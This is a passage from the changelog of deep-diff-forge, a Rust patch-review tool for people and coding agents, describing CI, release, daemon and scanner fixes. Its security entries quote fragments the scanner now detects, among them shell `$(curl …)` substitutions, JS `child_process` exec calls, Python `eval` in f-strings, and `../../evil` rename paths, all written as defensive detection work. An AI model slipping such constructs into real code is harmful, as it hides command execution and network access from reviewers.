  the push if `git rev-list` cannot resolve the range, so gitleaks' exit status is never the only
  signal.
- **`scripts/diff_mutation.sh` no longer passes untested when a changed Rust file's name has a
  space or a non-ASCII byte.** It detected Rust changes by matching `+++ b/crates/….rs` header
  text, but git appends a TAB to a header path with a space and C-quotes one with a non-ASCII
  byte (`core.quotePath`), so a change touching only such files printed "no Rust changes" and
  exited 0 in all four required shards (measured). Changed files now come from `git diff
  --name-only -z`, and the diff handed to cargo mutants is written with `core.quotePath=false`:
  cargo mutants 27.1.0 refuses a quoted header outright (measured, exit 6).
- **`scripts/diff_mutation.sh` gives the same answer from any directory.** Its `-- crates/`
  pathspec resolved against the current directory, so from a subdirectory the diff was empty and
  the gate passed with no mutants tested (measured). It now runs at the repository root; a
  relative `DDF_MUTATION_OUT` stays relative to the caller.
- **The release no longer compiles third-party code while holding write and OIDC tokens.** The
  `build` matrix held `contents: write`, `attestations: write` and `id-token: write` (on dry runs
  too) while `cargo build` ran every dependency's build scripts and proc macros, which could have
  minted an OIDC token for the release workflow's identity (inferred from GitHub's documented
  OIDC behaviour). `build` is now `contents: read` and keeps its archives as workflow artifacts; a
  new tag-only `release` job, which checks out and runs no project code, re-verifies the
  checksums, attests and uploads. `cli/tests/release_workflow.rs` refuses an elevated job that
  compiles.
- **A failed release platform no longer leaves a published, partial GitHub Release.** Each
  matrix leg (`fail-fast: false`) uploaded its own assets to a non-draft release, so the legs
  that passed published while a failed one only turned the run red (traced, not run). The one
  upload now happens in the `release` job, which needs every `build` leg; crates.io `publish`
  now needs `release`.
- **`scripts/fuzz_target.sh` fuzzes a fresh private corpus.** It reused a fixed
  `/tmp/ddf-<target>-corpus` with `mkdir -p`, so another local user could pre-create it with
  symlinks the seed copy wrote through (a planted `basic.patch` link overwrote its target with the
  fixture, measured), and inputs from earlier runs stayed in the corpus. The corpus is now a new
  `mktemp -d` directory (mode 0700) removed after the run; crashes stay in `fuzz/artifacts/`.
  Its root (`DDF_FUZZ_CORPUS_ROOT`, else `RUNNER_TEMP`, else `/tmp`) is still made when missing,
  as `mkdir -p` did, so a root that does not exist yet does not fail the run (measured).
- **`scripts/fuzz_target.sh --list` lists every `[[bin]]`, however it is laid out.** A line
  match took only a `name = "…"` on the line right after `[[bin]]`, so a valid table with `path`
  first or `name="x"` dropped out of the CI smoke and the weekly campaign while still compiling
  (measured). The list now comes from Python's `tomllib`.
- **`just ci` runs on the toolchain CI pins.** `scripts/ci_local.sh` ran every step but the MSRV
  check on the floating rustup default while `ci.yml` pins 1.99.1, so after a `rustup update` a
  local PASS could differ from CI (inferred). It now exports `RUSTUP_TOOLCHAIN=1.99.1`, exits 2
  if that toolchain, rustfmt or clippy is missing, and `ci_replica.rs` fails when its pin and
  `ci.yml`'s disagree.

### Documentation

- **Production readiness rescored at `main` `1eaba47`** (2026-11-02): self-assessment 91, Codex's
  independent rescore 89, reconciled 89 (`docs/PRODUCTION_READINESS.md`). The three bugs the
  bug hunt deferred are now listed in the repository too, as known limitations; they were
  recorded only in the maintainers' vault. `EVIDENCE.md` records the merges of #82 to #84.
- **The docs match `main` and say what is shipped, planned, withdrawn or on hold** (2026-11-01).
  Each design and planning doc opens with a dated status block naming the module behind what
  ships. Corrected: the Python install line (`@v0.5.0` has no `pyproject.toml`; it now names
  `@main`), the README's required-check table (it omitted `bench`), `<old> <new>` described as
  refused (VISION, gap analysis), `rank`, `annotate`, `render` and the extra cluster lanes
  listed as planned (they are withdrawn), the daemon sizing that assumed one request at a time,
  the dependency and fuzz-target lists, and the eval corpus size. Recorded the owner decisions
  of 2026-11-01: the `release` environment needs the owner's approval and deploys only from
  `v*` tags; secret scanning has push protection and provider patterns, gitleaks stands in for
  the non-provider patterns and validity checks GitHub does not offer this repository; the
  launchd agent on a physical Mac is on hold, an open item in ROADMAP and CONTRIBUTING.

## [0.5.0] - 2026-10-31

### Added

- **`deep-diff-forge bench [--quick] [--workload NAME]... [--json]`** times seven workloads on
  generated inputs and prints `deep-diff-forge.bench.v0`. That receipt carries the profile, the
  host, each input's SHA-256, and the min, median, p95 and KiB/s.
  - `scripts/bench_compare.py` compares receipts from one machine (best median per side; over
    25% and over 0.2 ms slower fails). A workload whose input changed is reported as not
    compared, and a malformed receipt exits 2.
  - A `bench` job on every pull request runs the merge base against the head (a required check from
    0.5.0, see Changed), and the weekly campaign keeps a full receipt.
- **`deep-diff-forge eval [--corpus DIR] [--json]`** scores ranking pairs, evidence precision
  and recall, and findings verdicts against `fixtures/eval/MANIFEST.json`, a hashed and labelled
  corpus of 11 cases with documented known misses. It prints `deep-diff-forge.eval.v0`.
  `cli/tests/eval.rs` holds the floors.

- **Daemon metrics.** `deep-diff-forge daemon metrics` (the daemon's `daemon.metrics`, protocol
  2) returns `deep-diff-forge.daemon-metrics.v0`:
  - per method that was called: requests, errors by RPC code, and latency as log₂ microsecond
    buckets with p50, p95 and p99 upper bounds;
  - admission: admitted, waited, wait time, busy refusals, and peak in-flight bytes and requests;
  - connections: accepted, refused at the limit, refused as another user, and errors;
  - engine: contained panics, session-table resets, and sessions opened, closed and evicted.

  Recording takes no lock (relaxed atomics). `deploy doctor` warns, with the counts, when a live
  daemon reports contained panics, busy refusals or session resets.
- **`daemon start --log-format json`:** one JSON object per log line (`ts_ms`, `level`, `event`,
  `message`). The default text line is unchanged.

- **Verified agent findings.** `deep-diff-forge findings verify --findings FILE [--require-all]`
  checks agent findings (JSONL, `deep-diff-forge.finding.v0`) against the patch on stdin.
  - It checks the hunk address or path and line, freshness (`review` against `input_sha256`),
    size, and duplicates. It prints the sealed `deep-diff-forge.findings.v0` verdict, with
    `claim_verified: false` always.
  - Accepted findings are normalised from the review (the line's own kind and text) and sanitised.
  - Refused ones carry one reason: `malformed`, `stale_review`, `unknown_path`,
    `unknown_address`, `line_outside_hunk`, `duplicate` or `too_long`.
  - The same verdict comes from the daemon's `findings.verify`, `rpc`, the MCP tool
    `verify_findings` and the Python SDK's `verify_findings`.
  - `review --findings FILE` shows the accepted findings in the cockpit as agent notes, never
    grounded, and a finding cannot pass for the engine's own notes.

- An address-anchored finding is resolved through a table of hunk addresses built once per
  call. Before (in this change's own first version), each finding hashed every hunk again: 2,000
  findings against 400 hunks took 3,560 ms. Now 33 ms (measured with `deep-diff-forge bench`,
  release build).

- A `findings_verify` fuzz target: every non-blank line gets exactly one verdict, every accepted
  anchor resolves, and no sanitised text keeps an unsafe character.

- **Code evidence in risk ranking.** Nine lexical signals are read from the changed lines
  themselves: `unsafe_added`, `process_spawn`, `network_fetch`, `dynamic_eval`, `ci_privilege`,
  `build_hook`, `secret_like`, `check_suppressed` and `test_removed`. They cover Rust, Python,
  JS/TS, Go, shell (with `Dockerfile` and `Makefile`) and YAML, and a shebang names the language
  of a file with no extension.
  - Comments and strings are blanked, with block comments and triple-quoted strings followed across
    a hunk's lines.
  - Each signal adds its weight once per file, and a path cannot hide it: token evidence keeps its
    weight under `generated/` or `vendor/`.
  - `rank.v0` lists each file's `evidence` (signal, hunk address, side, line, `basis: lexical`; at
    most 32). Outline and hunk heads list their labels. The daemon, `rpc`, MCP and the cockpit
    (one note per item, on its hunk) show the same.
  - Before, a hunk adding `unsafe { std::process::Command::new("curl") }` to `src/lib.rs` scored
    the same 7 as any `lib.rs` edit. Now it scores 15, with both signals at line 2.

- An `evidence_scan` fuzz target checks, for any patch, that every evidence item names its own
  hunk and a line inside it, and that the outline labels and the rank agree.

- The plan behind this and the next changes: `docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md`.

### Changed

- The pull-request `bench` comparison (`bench (base vs head)`, renamed from
  `bench (base vs head, informational)`) is a required check: ruleset 25868121 now requires
  eleven. A head over 25% and over 0.2 ms slower than its merge base on any workload blocks the
  merge.

- **Daemon protocol 2.** `findings.verify` is `since: 2`; clients that ask for protocol 0 or 1
  get the method lists they had.

- `deep-diff-forge-daemon` and `deep-diff-forge-cli` depend on `deep-diff-forge-agent`
  (`docs/crate-edges.txt`).

- CLI daemon tests wait up to 10 s, not 2 s, for a daemon to start or exit, so a loaded machine
  is not read as a failure. Two local gate runs had failed once each and did not reproduce in
  15 later full runs; a 2 s wait under a parallel build is the likely cause (inferred, not
  reproduced).

- **Breaking (graph crate):** `RankedFile` is `#[non_exhaustive]` and gains `evidence` and
  `evidence_truncated`. Build it with `RankedFile::scored(file)`, the one constructor, so score,
  signals and evidence always come from one assessment (`assess_file`). `RiskSignal` gains
  `Code(EvidenceSignal)`. `sort_ranked` is the one ranking order, and the cluster crate uses it.

### Fixed

- Code evidence is linear in the number of matching lines. Each new item was checked against
  every item already found, so one file of 160k lines that each add `unsafe` took 4.8 s (and
  the 64 MiB patch budget allowed far more); it takes 0.15 s. A changed line now yields each
  signal once by construction, however many rules or tokens match it.

### Security

- **Quoting code no longer hides it from code evidence** (DDF-EVID-001). The lexical view
  blanked everything between quotes, so `V="$(curl …)"` in shell,
  `` `${require("child_process").execSync(c)}` `` in JS and `f"{eval(x)}"` in Python carried no
  evidence. Code inside `$(…)`, `${…}` and backticks (shell double quotes), `${…}` (JS template
  literals) and `{…}` (one-line Python f- and t-strings, not `{{`; `\{` still runs) is now
  scanned as code up to its matching closer on the line. Inside it, strings are strings again, a
  backslash escapes, JS comments are comments, a shell `case` pattern's `)` is not a closer and
  a Python format spec is text, so neither a quoted closer hides the code after it nor a quoted
  token (`$(printf 'curl failed')`) is read as code. Single-quoted shell and plain or bytes
  Python strings still run nothing and stay blank.
- **The scanner errs toward code.** Three review rounds (226 agents) found ways a misread quote
  hid the rest of a line, most of them older than this change. Now:
  - a string still open at the end of a line (outside Rust) is read as code from its quote;
  - shell `#` is a comment only at a word start (`$#`, `${x#y}`, `a#b` are code);
  - a backslash escapes at the top of shell and JS lines;
  - ANSI-C `$'…'` strings honour escapes;
  - a JS regex literal's quotes open nothing, and a JS quote right after a word (JSX text,
    `Can't`) opens nothing;
  - nested Python triple quotes are known;
  - shell `case` is known after any command start (`if`, `while`, `!`, `time`, a pattern's
    `)`), `esac` only as a whole word that is not a pattern alternative;
  - a JS regex starts after an operator other than `<` and `>` (which open JSX tags), after `=>`
    and after a `return`/`typeof`-like keyword, not after `a++`, a property or a TypeScript
    non-null assertion (`x! / y`); a line that starts with `/` reads the previous line's last
    code byte; one failed regex probe ends probing, so a hostile line stays linear;
  - Rust raw strings (`r"…"`, `br#"…"#`) do not escape, so `r"C:\"` no longer hides the rest
    of its line.

  Not covered: triple-quoted f-strings, interpolations that span lines, continuation lines of
  multi-line strings (read as code), non-ASCII spellings of a token, JSX text, and a regex right
  after `if (…)`. The scanner is a reviewer's lens, not an adversarial boundary: no evidence
  means no token was found, never that a change is safe.
- **A JS `child_process` import is `process_spawn` evidence.** Before, the module name was only
  ever seen inside a string, which the code view blanks, so the rule could not fire. Imports are
  read through the code view (`require`, `module.require`, `import(…)`, `import …`, `from …`;
  any spacing or parentheses, any quote kind, `node:` optional). Comments, strings, regexes, `import type`/`export type` statements and
  `typeof import(…)` do not count; an `import(…)` type annotation does.
- `sanitize_body` (agent annotations, and now findings) drops bidi, invisible and
  line-separator characters as well as control characters. Before, Unicode category Cf
  characters such as U+202E were kept, so an agent's note could reorder or hide text for the
  next reader. `deep_diff_forge_core::is_unsafe_in_untrusted_text` is the one predicate.

## [0.4.0] - 2026-10-30

### Added

- **`deploy doctor [--json] [--socket PATH]`** checks that this machine can run the daemon and
  Git inputs, and changes nothing: the socket directory, the socket (absent, live, stale, of
  another user, or not a socket), the start lock, and `git version` (run the way an acquisition
  runs Git, within 10 s). The daemon checks apply the daemon's own start rules and never take the
  start lock. Exit 6 when a check fails; `--json` prints `deep-diff-forge.deploy-doctor.v0`.
- `deep_diff_forge_daemon::inspect` (with `Inspection`, `SocketState`, `LockState`, `DirState`)
  and `SocketLocation::start_lock_path`: a read-only view of a daemon location.
- `deep_diff_forge_patch::git_version`: Git's version line, bounded like an acquisition.

### Security

- **The daemon serves its own user only** (closes a 0.3.0 residual risk). Each accepted
  connection's effective uid is read from the kernel (`SO_PEERCRED` on Linux, `getpeereid` on
  macOS and the BSDs; other platforms refuse every client), and a client of another user is
  dropped and logged, whatever the socket's mode. The CLI, the Rust SDK (`SocketLocation::connect`)
  and the Python SDK (`SocketClient`) check the daemon's uid the same way and refuse a daemon of
  another user before sending anything; the CLI says `cannot use the daemon at PATH` (exit 6)
  rather than `no daemon at`.

### Fixed

- **The daemon runs requests in parallel** (closes a 0.3.0 residual risk). Before, every
  connection shared one `Mutex<Engine>`, so one slow request delayed every other client. Only
  the session table is locked now, and only for bookkeeping; parsing, ranking and Git run
  outside it. Admission caps the request bytes in flight at 128 MiB, first come, first served
  (`review.change` weighs the 64 MiB patch budget; a request heavier than the cap runs alone).
  Measured: six clients ranking a 2.75 MB patch, 23.4 to 56.8 requests per second;
  `daemon.health` under that load, 205 ms to 0.2 ms. A panic while the session table is held
  empties it; any other panic leaves every session in place. A request whose turn does not
  come within 30 s is answered `RESOURCE_EXHAUSTED` ("the daemon is busy") and gives up its
  place in the queue.
- CLI daemon tests kill their daemon when an assertion fails first (`Child` is not killed on
  drop); a mutation run had left one serving for 31 hours.

- **Two `daemon start`s can no longer race** (closes a 0.3.0 residual risk). Before, between the
  stale-socket probe and the bind, a second start could remove the first's fresh socket and bind
  its own, leaving the first running but unreachable. A start now takes a non-blocking exclusive
  `flock` on `<socket>.lock` before the probe and holds it until the daemon exits; a start that
  finds it held exits 6. The lock is opened without following symlinks and must be a regular file
  owned by the effective user.

### Changed

- **Breaking (daemon crate):** `dispatch`, `process_line` and `handle_connection` take
  `&Engine` instead of `&mut Engine` or `&Mutex<Engine>`; `Engine` is `Send + Sync` (checked at
  compile time). `MethodSpec` gains `work: Work`. New: `Admission`, `Permit`,
  `MAX_IN_FLIGHT_BYTES`, `ADMISSION_WAIT`, `Busy`, `Work`, `request_weight`,
  `Engine::admission`.

- **macOS tests run on every pull request** and `macOS tests` is a required check. Before, the
  job ran only weekly, on manual runs and on release, and two macOS breaks in PR #44 were caught
  only by a manual run.
- **A weekly campaign** (`.github/workflows/campaign.yml`, Mondays 05:41 UTC and on demand):
  a 10-minute hostile daemon soak with real review work and leak checks, and an hour of fuzzing
  for every fuzz target, each target its own job; a crash keeps its input as an artifact.
- The daemon soak runs real review work from four concurrent clients in every iteration and
  checks RSS growth (over 32 MiB fails) and open-fd growth (over 4 fails) across a run of a
  minute or more; `--require-growth-check` fails a run too short to measure them.
  `scripts/security/test_daemon_soak.py` covers the checks, in CI and `just ci`.
- `scripts/fuzz_target.sh` is the one place that knows each fuzz target's seeds and input cap;
  CI's 10 s smoke and the campaign both use it, and it lists the targets from `fuzz/Cargo.toml`.
- `SocketLocation::bind`, `bind_secure` and `bind_explicit` return a `BoundListener` (the
  listener and its start lock; `listener()` borrows the socket) instead of a `UnixListener`.
- `deep-diff-forge-daemon` uses rustix's `fs` and `net` features, and `nix` (`socket`, `user`)
  outside Linux for `getpeereid`; that adds `memoffset` to the lock file for those targets only.

## [0.3.0] - 2026-10-29

Tagged `v0.3.0` on 2026-10-29 by owner decision. 0.3.0 is minor rather than patch because the
library APIs changed incompatibly since 0.2.1 (see *Changed*). 0.2.1 was never tagged, so this
release follows v0.2.0. The workspace reached 0.3.0 on 2026-10-28; the expert-circle, bug-hunt
and owner-decision entries below landed before the tag. crates.io publication stays on hold.

### Changed (owner decisions on the bug hunt, 2026-10-29)

- **A rename or copy that Git refuses is refused** (H1-09). `rename to ../../evil`, an absolute
  path, or a `.`, `..` or `.git` component in a rename or copy path now fails with exit 4
  (`InvalidPath`), as `git apply` fails with "invalid path". DDF used to show such a patch with a
  `path_traversal` hazard. A plain `---`/`+++` path keeps its hazard, since a non-Git diff may
  legitimately name `../`.
- **Copies are `copied`** (H1-09). A `copy from`/`copy to` file reported `modified`.
- **A mode-only change is `mode_changed`** (H4-07). Flipping the executable bit reported
  `type_changed`, which now means only that the object type changed (a file, a symlink or a
  submodule became another). A mode header that is not one to six octal digits is refused
  (`InvalidMode`), as `git apply` refuses it.
- **Symlinks and new executables are risk signals** (H4-07). `symlink_change` (+3) fires when a
  symlink is created, changed, removed or made from a file; `executable_bit` (+2) fires when a
  file becomes executable. A generated or vendored path keeps both.
- The TUI tree marks copies `C` and mode-only changes `X`.
- **The hostile daemon soak sends oversize and flood traffic** (H5-09). It checks a request of
  exactly 80 MiB is served and one byte more is refused with the connection closed; that with
  all 8 connection slots held a ninth is closed unanswered, and the daemon serves again once
  they leave; and that 32 concurrent clients get only valid answers or closed connections.

### Fixed (expert circle, 2026-10-28)

A seven-seat expert circle reviewed DDF as pioneer coding agents would use it: Claude Code, Codex,
Zen (pi) and four specialist personas. It found these defects, each reproduced with the 0.3.0
binary and each fixed with a test that fails on the old code.

- **A rewritten comment is never "formatting only".** In tree-sitter-rust a plain comment's text
  is no leaf token, so `structural` and `analyze` reported `// SAFETY: the pointer is valid` →
  `// SAFETY: trust me` as `reformat_only: true` with no change. A comment is now one token,
  compared byte for byte. A new fuzz target, `structural_soundness`, checks that
  `reformat_only` is claimed only when the sources differ in whitespace alone (1,077,956 runs,
  0 crashes, measured locally).
- **A path can lower a file's risk but never zero it.** `generated/`, `vendor/`, `dist/` and
  similar paths used to score 0, so a new `src/generated/x.rs` that spawns a process ranked below
  a one-line README edit. The patch author chooses the path. Such files now keep the base weight
  and their new, deleted or binary signal, without the source, size or API bonuses.
- **`highlight` prints line breaks.** It escaped each line feed as the text `\x0a`, so a file
  printed on one line. Every other control character is still escaped.
- **Parse errors quote at most 120 bytes of the offending line** and count the rest. A 2 MB
  line made a 2,000,074-byte error, in a terminal or an agent's context.
- **Every command answers `--help`** (exit 0) from one table that `--help` also prints. Before,
  only `review` did; the others exited 2, and `council --help` exited 4.

### Security (bug hunt, 2026-10-28)

- **Patch truth: lines Git ignores are refused, not read as headers** (H1-01, high). After a
  file's hunk, `new file mode`, `deleted file mode`, `rename to`, mode lines, a lone `+++` or a
  lone `--- /dev/null` changed the reviewed status or path, or made a phantom file, while `git
  apply` applied a plain modification. Mode lines even changed the rendered patch (644 became
  755). Extended headers are now admitted only before a file's `---`/`+++` or first hunk, a `+++`
  only right after its `---`, and a `---` only with its `+++`.
- **Input Git refuses as corrupt is refused** (H1-04): a signed hunk range (`@@ -+1`), a final
  hunk line without a line feed, `new file`/`deleted file` contradicting `/dev/null`, a new and
  deleted file, a new or deleted file that is also renamed or copied, or a new file with old lines.
  New errors: `MisplacedHeader`, `InconsistentHeader`, `UnterminatedLine` (all exit 4).
  Fuzzing found six such contradictions in the first rounds; each is a regression fixture, and
  the final rounds ran 5,778,549 (`patch_parser`) and 2,261,936 (`review_json`) inputs with no
  crash.

A team of five Sonnet bug hunters covered the whole stack: patch and core, daemon/rpc/MCP/SDKs,
CLI and council, analysis and TUI, CI/scripts/supply chain. Each finding was re-checked by an
independent false-positive checker before a fix.
- **Repository filters never run.** A clean or process filter defined in a repository's own
  configuration and named in its `.gitattributes` ran during working-tree acquisition
  (`--git-working-tree`, `review.change`), so reviewing a repository someone handed you ran their
  code. Every filter the local configuration defines is turned off for each Git call; the user's
  global filters, such as Git LFS, stay on.
- **`review.change` refuses foreign Git directories.** A `.git` file inside an allowed root could
  point at a repository outside it. The top level, the Git directory and the common directory must
  all be under an allowed root, and an object store with alternates is refused.
- **The Git time limit holds** even when a child Git started keeps its pipes open.
- **The daemon refuses params a method does not take**, so a misspelt guard such as
  `require_file` no longer passes an empty review. MCP enforces its schema enums.
- `highlight` keeps line breaks without colour too (the earlier fix covered only colour).
- **An edit inside a multi-line comment is analyzed.** `analyze` attributed a changed token to a
  hunk by its first line only, so with `diff -U0` a rewritten `SAFETY:` line inside a block
  comment produced no semantic span while coverage still said `analyzed`. A token now belongs to
  the first hunk holding any of its lines, and a changed token no hunk holds makes coverage
  `partial_lcs`.
- The daemon soak no longer passes its memory bound with no RSS sample (no `/proc`), checks that
  a stopped daemon removed its socket, and logs the daemon to a file instead of a pipe nobody
  drained.
- **A rename out of `.git` is hazardous too.** Renaming `.git/hooks/pre-commit` to `src/y.rs`
  scored no signal while the reverse rename raised `hazardous_text`; the path a rename or copy
  leaves now counts.
- **Headless probes show what a terminal shows.** `review --probe` printed a space after each
  wide character (`界 界`), so its lines measured wider than the terminal they describe; the
  cell a wide character covers is skipped now.
- **The command panel wraps.** At 80 columns the notes panel cut the hazard warning after "what
  you see", losing "may not be what applies."; each panel line wraps at the panel width.
- A semantic note counts each change kind (`3 node added, 1 node removed`) instead of naming
  every span after the first one's kind.
- **A submodule change is captured whatever configuration says.** `diff.ignoreSubmodules = all`,
  from any configuration level, or a `.gitmodules` `ignore = all` dropped a staged submodule
  change from `--git-*` and `review.change` with exit 0, so a gate saw no files. Every
  acquisition now passes `--ignore-submodules=none`.
- **`review.change` names what it did not capture.** An untracked nested repository is not in
  the files; only the CLI's stderr said so. The `acquisition` member now lists it under
  `omitted_untracked`.
- A `GitAcquireOptions::byte_budget` of `usize::MAX` no longer wraps to a zero-byte read.
- **One output mode at a time.** `--outline --hunks` printed the outline, `--rank --cluster` one of
  the two, and `--outline --path`/`--address` dropped the selector, all with exit 0. Each is now
  a usage error (exit 2) before any input is read.
- **`git format-patch` output is read.** Its bare `---` before the diffstat and its `-- `
  signature were refused as body lines outside a hunk, so `git format-patch -1 --stdout |
  deep-diff-forge --stdin-patch` exited 4. Git ignores both outside a hunk; so does DDF now,
  for those exact lines only.
- **View pages hold their budget on every surface.** Each was reproduced before the fix:
  - A 200 KB `@@` heading made a 1 KiB page 200,616 bytes and repeated on every continuation
    page. A view now carries at most 256 bytes of a heading, flagged `section_truncated`
    (`review.v0` keeps it whole).
  - MCP view answers ran to 1.39× `max_bytes`, because the escaped text copy grows past half.
    They are now re-paged smaller (`views::fit_emitted`) until the whole result fits.
  - The CLI printed views indented but budgeted them compact (4,688 bytes for
    `--max-bytes 4096`). It now prints the daemon's one-line page.
- **A path or address selects every match.** `paths` returned only the first section of a path
  that a concatenated patch names twice, and `addresses` the first of two identical hunks.
- **`highlight` is bounded by nesting depth.** Its query cost grows with depth, not size: a
  60,000-deep brace nest took 58 s (debug) and 20 s (release) to highlight, while the same node
  count laid out flat took 0.14 s. Past 4,096 levels or the 200,000-node budget `semantic` uses,
  `highlight` prints plain text; the deep nest now returns in 0.16 s.
- **A comment's line ending is formatting.** A line comment's token held its line feed, so CRLF
  conversion or a trailing space made `structural` and `analyze` report a rewritten comment. Each
  comment line's trailing whitespace is dropped from its token; a changed word still counts.
- **The cockpit refuses a patch that names a path twice.** `review` matched content and notes
  by path, so two concatenated patches touching one file showed the first section's content and
  notes for both, and the second section was never shown. It now exits 4 and names the path;
  `deep_diff_forge_tui::duplicate_path` finds it for library callers.
- **Hazards cover the invisible-payload classes.** Word joiners and invisible operators
  (`U+2060–2064`), the soft hyphen, the combining grapheme joiner, the Mongolian vowel separator,
  the Hangul fillers, variation selectors (`U+FE00–FE0F`, `U+E0100–E01EF`) and tag characters
  (`U+E0000–E007F`) were neither flagged nor escaped. They are now `invisible` and shown as
  `\u{XXXX}` on a terminal. The line and paragraph separators `U+2028`/`U+2029` are `control`.
  A path that ends in a carriage return (a CRLF-converted header) is `control` too; only a body
  line's CRLF is exempt.
- **No JSON record splits on a Unicode line break.** A path or line holding `U+2028`/`U+2029`
  left `--json`, `--jsonl`, `rpc`, MCP and the daemon socket raw, so a line-aware reader
  (Python's `splitlines`, JavaScript before ES2019) saw one record as two. `json_escape` now
  escapes both, and the serde-built lines pass through the new `core::json_line_safe` before
  they are written; the parsed values are unchanged.

### Added (agent batteries)

- **`agent setup --client claude|codex [--allow-repo PATH]...`** prints the registration of this
  binary's MCP server: a `claude mcp add --scope user …` line and a `.mcp.json` block, or a
  `~/.codex/config.toml` table. It never writes a file. `--json` gives
  `deep-diff-forge.agent-setup.v0`.
- **`agent doctor [--json]`** checks in-process that the MCP handshake and the seven tools'
  output schemas are in place, and that one patch gets the same sealed document from the CLI
  path, the daemon and MCP, the same ranking from `diff.rank` and `rank_patch`, and a bounded
  outline-then-hunk answer. It exits 101 if any check fails. A test runs it on every build.
- **Hazards** (expert circle, Sana Rahimi, narrowed by Zen to objective facts). The facts are:
  `bidi_control`, `invisible` and `control` on lines (a CRLF's carriage return excepted), and
  `path_traversal` and `git_internal` on paths.
  - They are reported in `review.v0` (only where found), in the views and in the outline.
  - A new risk signal, `hazardous_text` (+3), lifts such a file, even under a generated path.
  - The cockpit explains the signal.
- **`rpc` and the daemon name the framing** when a request line is cut short (the start of a
  pretty-printed object): one JSON value per line.

### Added (agent-first core)

The expert circle's Tier 1: an agent learns where to look before it reads anything large, and
never has to paste a patch.

- **Hunk addresses in `review.v0`** (additive): `address` (SHA-256 of `ddf-hunk-v1`, path,
  ranges and body: exactly this hunk of this patch), `body_sha256` (the body alone: it survives a
  move), `section` (the `@@` heading, display only, never re-rendered) and `old_lines` /
  `new_lines`.
- **Budgeted, sealed views.**
  - `review.outline` lists files in review-risk order with their hunks' addresses, ranges,
    headings and counts, and no line text.
  - `review.hunks` returns chosen hunks verbatim, by address or by path.
  - Both keep every answer within `max_bytes`, continue a long hunk at a line (never inside one),
    and page with a cursor bound to the patch and the selection.
  - They are available on the socket, over `rpc`, as the MCP tools `review_outline` and
    `review_hunks` (where `max_bytes` counts both copies of the answer), and on the CLI as
    `--outline` and `--hunks [--address A]... [--path P]... [--max-bytes N] [--cursor C]` for
    piped patches and Git selections alike.
  - Parity tests hold the CLI equal to the daemon page for page.
- **`review.change` and MCP `review_change`: review straight from Git.**
  - Selections are staged, working tree or range. The answer is the outline or hunks of the
    change, sealed over Git's exact bytes, with an `acquisition` member.
  - It reads only repositories whose canonical path and Git top level are under a root the
    operator allowed with `--allow-repo PATH`, on `mcp`, `rpc` and `daemon start`. Without one it
    reads nothing.
  - Tests cover an outside repository, an escaping symlink and a subdirectory of a larger
    repository.
- **Git subprocesses have a time limit** (closes a 2026-10-28 residual risk). One deadline bounds
  every Git call of an acquisition, 120 s for the CLI and 30 s for `review.change`. A Git still
  running is killed and the acquisition fails with `TimedOut` (exit 3) instead of hanging on a
  stalled filesystem or hook.

### Added

- **`diff.rank`**, a daemon method on the socket, `rpc` and MCP: the sealed
  `deep-diff-forge.rank.v0` document that `--stdin-patch --rank --json` prints, with the same
  input guards. A parity test holds it equal to the CLI on every fixture. The Python SDK gains
  `rank_patch`.
- **MCP tools declare an `outputSchema`,** and a test checks every tool's results against it.

### Changed

- **MCP `rank_patch` returns the sealed `rank.v0` object** (through `diff.rank`), and its
  summary keeps the seal. It used to return `diff.plan`'s bare array, which the MCP tools
  specification does not allow as `structuredContent`, and which could not say which bytes it
  ranked. `rank_patch` also takes `require_files` and `require_hunks`.

### Added (documentation and community)

- **The README is rewritten from the code.**
  - Three graphics: a terminal session generated from the binary's real output
    (`scripts/docs/render_terminal_svg.py`), an architecture diagram that adapts to light and
    dark themes, and a refreshed banner (14 crates, 1,354 tests).
  - A Mermaid crate graph drawn from `docs/crate-edges.txt`.
  - The risk-ranking weights from `risk.rs`.
  - The nine required checks.
  - The production-readiness verdict and its known limits.
  - A documentation map.
- **An open call for contributors:** `CONTRIBUTING.md` (setup, the quality bar, open problems
  worth owning), `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1), issue forms for bugs and
  features, and a pull request template.
- **Every document under `docs/`, plus `SECURITY.md`, `EVIDENCE.md` and `NOTES.md`,**
  is checked against the code at 0.3.0:
  - target designs say what exists today;
  - ledgers and history carry a dated status block, and no past entry is rewritten;
  - surfaces that are refused today are labelled.

### Fixed (found while checking the docs against the code)

- **`review --cmd` refuses an unknown command name** (exit 2, naming the commands there are).
  Before, a typo fell through to `rank` and exited 0. A `--cols` or `--rows` value that is not a
  number is refused too; before, it silently became the default.
- **`--parallel` refuses anything but `serial`, `auto` or a count from 1** (exit 2). Before, an
  unreadable count ran as `auto`, and `0` was reported as `fixed:0` while one worker ran.
- **`analyze` with the wrong number of paths, or an option, exits 2** (fix the command line).
  Before, a missing path exited 4 (change the input).
- **`deploy release` no longer claims a GitHub release for an untagged version.**
  `github-release` is `blocked` until the owner tags, so `pending` lists it with crates.io. It
  used to report `published` for 0.2.1, which was never tagged.
- **A tag release runs the macOS tests.** `release.yml` calls `ci.yml` with the tag push's
  event, which the macOS job did not accept, so a tagged release would have shipped macOS
  binaries tested only by an earlier dry run.
- **`just release-tag` pushes the tag to `origin`.** It used to push to a remote named
  `github` that no checkout has. Its comment now describes the crates.io hold, not a token.
- `--help` no longer says learned scores set engine defaults; nothing reads them yet.
  `chain-contract` no longer promises a schema version on every JSONL record; each record names
  its event.

### Added

- **Every exit code names what to do next.** The registry gives each code an
  `action` (`proceed`, `fix_invocation`, `check_environment`, `change_input`,
  `review_evidence`, `report_bug`) and `may_be_transient`; `schema exit-codes`,
  `explain --json` and the MCP exit-code tools report both, and the README
  tables carry a checked Next column. A new code cannot be added without one.
- **A release dry run.** `release.yml` runs on `workflow_dispatch`: the quality
  and supply-chain gates and all three builds, with each executable binary
  smoke-tested and every archive's checksum verified, while releasing and
  attesting stay limited to tag refs. Tag releases get the same smoke and
  checksum checks before anything is published.
- **macOS tests.** A `macos` CI job runs the workspace tests on `macos-latest`
  weekly and on manual runs, including a dispatched release dry run.
- **Deployment resource requirements** in `docs/OPERATIONS_AND_DAEMON.md`: the
  measured memory of maximum-size requests and the `/tmp` inode limit.
- **The review JSON marks the line that was decoded lossily** (`"lossy": true`
  on the line), beside the per-file `lossy_lines` count, so a consumer need not
  guess from U+FFFD. Measured with a JSON-only rebuild sweep over 1,127 real
  commits: every other text file rebuilds to its exact blob.

### Added (slice C: SDKs)

- **Rust: the `deep-diff-forge-sdk` crate.** `review` (with `InputGuards`)
